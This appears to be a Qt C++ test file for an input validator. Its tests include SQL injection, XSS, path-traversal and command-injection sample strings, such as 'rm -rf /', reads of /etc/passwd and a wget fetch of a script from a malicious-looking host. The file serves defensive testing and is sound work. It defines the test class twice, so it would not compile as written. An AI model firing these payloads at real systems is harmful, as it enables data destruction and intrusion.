#pragma once
#include <QObject>
#include <QtTest/QtTest>
#include "../src/security/InputValidator.h"
#include "../src/modern/ErrorHandling.h"

using namespace CyberRecon;

/**
 * @brief Comprehensive security tests for input validation and authentication
 */
class SecurityTests : public QObject {
    Q_OBJECT

private slots:
    // Input validation tests
    void testUsernameValidation();
    void testPasswordValidation();
    void testEmailValidation();
    void testSqlInjectionDetection();
    void testXssDetection();
    void testPathTraversalDetection();
    void testCommandInjectionDetection();
    void testRateLimiting();
    
    // Authentication tests
    void testPasswordHashing();
    void testAccountLockout();
    void testSessionSecurity();
    
    // Form validation tests
    void testFormValidation();
    void testFormSanitization();
    
    // Error handling tests
    void testResultType();
    void testErrorContexts();

private:
    void testMaliciousInput(const QString& input, const QString& expectedThreat);
};

class SecurityTests : public QObject {
    Q_OBJECT

private slots:
    void testUsernameValidation() {
        // Valid usernames
        QVERIFY(VALIDATE_USERNAME("testuser").isValid);
        QVERIFY(VALIDATE_USERNAME("test_user").isValid);
        QVERIFY(VALIDATE_USERNAME("user123").isValid);
        QVERIFY(VALIDATE_USERNAME("test.user").isValid);
        QVERIFY(VALIDATE_USERNAME("test-user").isValid);
        
        // Invalid usernames
        QVERIFY(!VALIDATE_USERNAME("").isValid);
        QVERIFY(!VALIDATE_USERNAME("te").isValid); // too short
        QVERIFY(!VALIDATE_USERNAME("test user").isValid); // space
        QVERIFY(!VALIDATE_USERNAME("test@user").isValid); // special char
        QVERIFY(!VALIDATE_USERNAME(".testuser").isValid); // starts with dot
        QVERIFY(!VALIDATE_USERNAME("testuser.").isValid); // ends with dot
        
        // Long username test
        QString longUsername(50, 'a');
        QVERIFY(!VALIDATE_USERNAME(longUsername).isValid);
    }
    
    void testPasswordValidation() {
        // Valid passwords
        auto result1 = VALIDATE_PASSWORD("TestPass123!");
        QVERIFY(result1.isValid);
        
        auto result2 = VALIDATE_PASSWORD("MySecureP@ssw0rd");
        QVERIFY(result2.isValid);
        
        // Invalid passwords
        QVERIFY(!VALIDATE_PASSWORD("").isValid);
        QVERIFY(!VALIDATE_PASSWORD("short").isValid);
        QVERIFY(!VALIDATE_PASSWORD("12345678").isValid); // no letters
        
        // Password with warnings
        auto weakResult = VALIDATE_PASSWORD("password123");
        QVERIFY(weakResult.isValid); // Valid but has warnings
        QVERIFY(!weakResult.warnings.isEmpty());
        
        // Very long password
        QString longPassword(150, 'a');
        QVERIFY(!VALIDATE_PASSWORD(longPassword).isValid);
    }
    
    void testEmailValidation() {
        // Valid emails
        QVERIFY(VALIDATE_EMAIL("test@example.com").isValid);
        QVERIFY(VALIDATE_EMAIL("user.name+tag@example.org").isValid);
        QVERIFY(VALIDATE_EMAIL("123@domain-name.com").isValid);
        
        // Invalid emails
        QVERIFY(!VALIDATE_EMAIL("").isValid);
        QVERIFY(!VALIDATE_EMAIL("invalid").isValid);
        QVERIFY(!VALIDATE_EMAIL("@example.com").isValid);
        QVERIFY(!VALIDATE_EMAIL("test@").isValid);
        QVERIFY(!VALIDATE_EMAIL("test@@example.com").isValid);
        QVERIFY(!VALIDATE_EMAIL("test@example").isValid); // no TLD
    }
    
    void testSqlInjectionDetection() {
        QStringList sqlInjectionAttempts = {
            "'; DROP TABLE users; --",
            "1' OR '1'='1",
            "UNION SELECT password FROM users",
            "'; INSERT INTO users VALUES ('hacker', 'pass'); --",
            "1; DELETE FROM users WHERE 1=1; --",
            "' OR 1=1 /*",
            "admin'--",
            "' UNION SELECT NULL, username, password FROM users--"
        };
        
        for (const QString& attempt : sqlInjectionAttempts) {
            QVERIFY2(InputValidator::containsSqlInjection(attempt), 
                     qPrintable(QString("Failed to detect SQL injection: %1").arg(attempt)));
        }
        
        // Valid inputs should not trigger detection
        QVERIFY(!InputValidator::containsSqlInjection("normal user input"));
        QVERIFY(!InputValidator::containsSqlInjection("test@example.com"));
        QVERIFY(!InputValidator::containsSqlInjection("My name is O'Connor"));
    }
    
    void testXssDetection() {
        QStringList xssAttempts = {
            "<script>alert('XSS')</script>",
            "<img src='x' onerror='alert(1)'>",
            "javascript:alert('XSS')",
            "<iframe src='javascript:alert(1)'></iframe>",
            "<svg onload='alert(1)'>",
            "<body onload='alert(1)'>",
            "<input onfocus='alert(1)' autofocus>",
            "data:text/html,<script>alert(1)</script>"
        };
        
        for (const QString& attempt : xssAttempts) {
            QVERIFY2(InputValidator::containsXssAttempt(attempt),
                     qPrintable(QString("Failed to detect XSS: %1").arg(attempt)));
        }
        
        // Valid HTML-like content should not trigger for basic text
        QVERIFY(!InputValidator::containsXssAttempt("normal text"));
        QVERIFY(!InputValidator::containsXssAttempt("email@domain.com"));
    }
    
    void testPathTraversalDetection() {
        QStringList pathTraversalAttempts = {
            "../../../etc/passwd",
            "..\\..\\windows\\system32\\config\\sam",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "....//....//....//etc//passwd",
            "../../../../../../../etc/passwd",
            "..\\..\\..\\..\\..\\..\\windows\\system32"
        };
        
        for (const QString& attempt : pathTraversalAttempts) {
            QVERIFY2(InputValidator::containsPathTraversal(attempt),
                     qPrintable(QString("Failed to detect path traversal: %1").arg(attempt)));
        }
        
        // Valid paths should not trigger
        QVERIFY(!InputValidator::containsPathTraversal("/home/user/document.txt"));
        QVERIFY(!InputValidator::containsPathTraversal("C:\\Users\\user\\document.txt"));
        QVERIFY(!InputValidator::containsPathTraversal("filename.txt"));
    }
    
    void testCommandInjectionDetection() {
        QStringList commandInjectionAttempts = {
            "; rm -rf /",
            "| cat /etc/passwd",
            "&& dir",
            "$(whoami)",
            "`id`",
            "; wget http://malicious.com/script.sh",
            "|| echo vulnerable",
            "; powershell -c \"Get-Process\""
        };
        
        for (const QString& attempt : commandInjectionAttempts) {
            QVERIFY2(InputValidator::containsCommandInjection(attempt),
                     qPrintable(QString("Failed to detect command injection: %1").arg(attempt)));
        }
        
        // Valid inputs should not trigger
        QVERIFY(!InputValidator::containsCommandInjection("normal user input"));
        QVERIFY(!InputValidator::containsCommandInjection("email@domain.com"));
    }
    
    void testRateLimiting() {
        QString testIdentifier = "test_user_validation";
        
        // Clear any existing rate limit
        InputValidator::clearRateLimit(testIdentifier);
        QVERIFY(!InputValidator::isRateLimited(testIdentifier));
        
        // Simulate failed attempts
        for (int i = 0; i < 15; ++i) {
            InputValidator::recordValidationAttempt(testIdentifier, false);
        }
        
        // Should be rate limited now
        QVERIFY(InputValidator::isRateLimited(testIdentifier));
        
        // Clear and verify
        InputValidator::clearRateLimit(testIdentifier);
        QVERIFY(!InputValidator::isRateLimited(testIdentifier));
    }
    
    void testFormValidation() {
        FormValidator validator;
        
        // Set up validation rules
        validator.addField("username", InputValidator::ValidationRule::Username, true);
        validator.addField("email", InputValidator::ValidationRule::Email, true);
        validator.addField("age", InputValidator::ValidationRule::Numeric, false);
        
        // Valid form data
        QHash<QString, QString> validData;
        validData["username"] = "testuser";
        validData["email"] = "test@example.com";
        validData["age"] = "25";
        
        auto result1 = validator.validate(validData);
        QVERIFY(result1.isSuccess());
        QVERIFY(validator.isFormValid());
        
        // Invalid form data
        QHash<QString, QString> invalidData;
        invalidData["username"] = ""; // Required but empty
        invalidData["email"] = "invalid-email"; // Invalid format
        invalidData["age"] = "not-a-number"; // Invalid format
        
        auto result2 = validator.validate(invalidData);
        QVERIFY(result2.isError());
        QVERIFY(!validator.isFormValid());
        QVERIFY(!validator.getFieldErrors("username").isEmpty());
        QVERIFY(!validator.getFieldErrors("email").isEmpty());
        QVERIFY(!validator.getFieldErrors("age").isEmpty());
    }
    
    void testFormSanitization() {
        InputValidator::ValidationOptions options;
        options.trimWhitespace = true;
        
        auto result = InputValidator::validate("  <script>alert('xss')</script>  ", 
                                             InputValidator::ValidationRule::XssSafe, 
                                             options);
        
        QVERIFY(result.isValid);
        QVERIFY(!result.sanitizedValue.contains("<script>"));
        QVERIFY(result.sanitizedValue.trimmed() == result.sanitizedValue);
    }
    
    void testResultType() {
        // Test successful result
        auto successResult = Result<int>::success(42);
        QVERIFY(successResult.isSuccess());
        QVERIFY(!successResult.isError());
        QCOMPARE(successResult.value(), 42);
        QCOMPARE(successResult.valueOr(0), 42);
        
        // Test error result
        auto errorResult = Result<int>::error(ErrorCode::ValidationError, "Test error");
        QVERIFY(!errorResult.isSuccess());
        QVERIFY(errorResult.isError());
        QCOMPARE(errorResult.valueOr(99), 99);
        QCOMPARE(errorResult.error().code, ErrorCode::ValidationError);
        
        // Test transformation
        auto transformedResult = successResult.map([](int value) { return value * 2; });
        QVERIFY(transformedResult.isSuccess());
        QCOMPARE(transformedResult.value(), 84);
        
        // Test error propagation
        auto errorTransformed = errorResult.map([](int value) { return value * 2; });
        QVERIFY(errorTransformed.isError());
    }
    
    void testErrorContexts() {
        // Test context tracking
        {
            ValidationContext ctx1("Function1");
            QCOMPARE(ValidationContext::getCurrentContext(), QString("Function1"));
            
            {
                ValidationContext ctx2("Function2");
                QCOMPARE(ValidationContext::getCurrentContext(), QString("Function1 -> Function2"));
                
                ctx2.addWarning("Test warning");
                QCOMPARE(ctx2.getWarnings().size(), 1);
            }
            
            QCOMPARE(ValidationContext::getCurrentContext(), QString("Function1"));
        }
        
        QVERIFY(ValidationContext::getCurrentContext().isEmpty());
    }

private:
    void testMaliciousInput(const QString& input, const QString& expectedThreat) {
        qDebug() << "Testing malicious input:" << input << "for threat:" << expectedThreat;
        // Test implementation would depend on specific threat detection
    }
};